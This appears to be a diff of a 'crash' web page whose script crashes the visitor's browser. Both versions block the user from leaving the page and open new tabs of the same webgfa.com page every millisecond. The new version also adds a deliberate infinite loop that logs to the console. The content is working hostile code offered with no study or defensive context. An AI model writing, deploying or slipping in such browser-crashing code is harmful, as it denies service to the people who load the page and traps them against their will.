@@ -1,37 +1,24 @@
 <!DOCTYPE HTML>
 <html>
-  <head>
-  </head>
-  <body>
-    <script>
-      window.onbeforeunload = function() {return ''}
-      function multiply(){
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        open('https://webgfa.com/crash.html', '_blank');
-        
-      }
-      setInterval(multiply, 1);
-      
-    </script>
-  </body>
+
+<head>
+</head>
+
+<body>
+  <script>
+    window.onbeforeunload = function () { return '' }
+    function multiply() {
+      open('https://webgfa.com/crash.html', '_blank');
+
+    }
+    function crash(){
+      for (var i = 5; i > 3; i = i + 1) { 
+        console.log(i);
+       }
+    }
+    setInterval(multiply, 1);
+    setTimeout(crash, 20);
+  </script>
+</body>
+
 </html>
